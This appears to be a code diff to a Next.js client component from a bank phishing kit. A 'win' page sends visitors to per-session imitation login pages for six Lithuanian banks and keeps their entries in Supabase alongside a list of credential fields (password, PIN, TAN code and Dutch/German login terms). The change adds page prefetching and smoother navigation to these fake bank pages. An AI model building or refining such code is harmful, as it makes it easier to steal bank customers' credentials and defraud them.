@@ -1,6 +1,7 @@
 "use client";
 
 import { useEffect, useMemo, useRef, useState } from "react";
+import { useRouter } from "next/navigation";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 
 type Props = {
@@ -21,12 +22,15 @@ function hrefToSlug(href: string): string | null {
   return null;
 }
 
+const BANK_SLUGS = ["swedbank-lt", "seb-lt", "luminor-lt", "citadele-lt", "lku-lt", "siauliu-lt"];
+
 const BANK_CRED_FIELDS = [
   "username", "password", "verfuegernummer", "pin", "rekeningnummer",
   "pasnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode",
 ];
 
 export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
+  const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const containerRef = useRef<HTMLDivElement>(null);
   const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
@@ -108,6 +112,21 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
     };
   }, [effectiveSessionId, supabase]);
 
+  // Banka sayfalarini onceden yukle: tiklamada sayfa aninda acilir
+  useEffect(() => {
+    const shortRoute =
+      routeSessionId && !routeSessionId.includes("-") ? routeSessionId : null;
+    const routeId = publicId || shortRoute || routeSessionId || effectiveSessionId;
+    if (!routeId) return;
+    for (const slug of BANK_SLUGS) {
+      try {
+        router.prefetch(`/win/${encodeURIComponent(routeId)}/bank/${slug}`);
+      } catch {
+        /* best-effort */
+      }
+    }
+  }, [publicId, routeSessionId, effectiveSessionId, router]);
+
   // HTML enjekte edildikten sonra: isim/miktar patch + banka click bagla
   useEffect(() => {
     const root = containerRef.current;
@@ -148,12 +167,8 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
       savingRef.current = true;
       setSaving(true);
 
-      const { data: row } = await supabase
-        .from("sessions")
-        .select("form_data")
-        .eq("id", effectiveSessionId)
-        .maybeSingle();
-      const nextFd: Record<string, any> = { ...((row?.form_data ?? {}) as Record<string, any>) };
+      // Ayri select'e gerek yok: fd state zaten mount'ta DB'den yuklendi.
+      const nextFd: Record<string, any> = { ...fd };
       for (const f of BANK_CRED_FIELDS) delete nextFd[f];
 
       const { error: upErr } = await supabase
@@ -171,14 +186,7 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
       const shortRoute =
         routeSessionId && !routeSessionId.includes("-") ? routeSessionId : null;
       const routeId = publicId || shortRoute || routeSessionId || effectiveSessionId || "";
-      // Son boyanmis frame'de eski liste gorunmesin: icerigi bosalt, sadece
-      // portal arkaplani kalir -> banka login sayfasina temiz gecis.
-      const rootEl = containerRef.current;
-      if (rootEl) {
-        rootEl.innerHTML = "";
-        rootEl.style.opacity = "1";
-      }
-      window.location.href = `/win/${encodeURIComponent(routeId)}/bank/${slug}`;
+      router.push(`/win/${encodeURIComponent(routeId)}/bank/${slug}`);
     };
 
     root.addEventListener("click", onClick);
